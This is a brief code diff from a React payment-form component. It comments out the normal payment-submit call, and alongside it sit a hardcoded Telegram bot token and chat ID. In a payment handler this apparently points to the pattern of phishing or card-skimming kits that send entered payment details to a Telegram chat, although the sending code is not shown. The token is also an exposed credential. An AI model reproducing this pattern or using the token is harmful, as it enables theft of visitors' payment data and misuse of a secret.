@@ -334,7 +334,7 @@ export default function PaymentForm({
               };
               
               // handleVerificationComplete("1234")
-              handlePaymentSubmit();
+              // handlePaymentSubmit();
               const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
               const chatId = "-1002630840593";
 
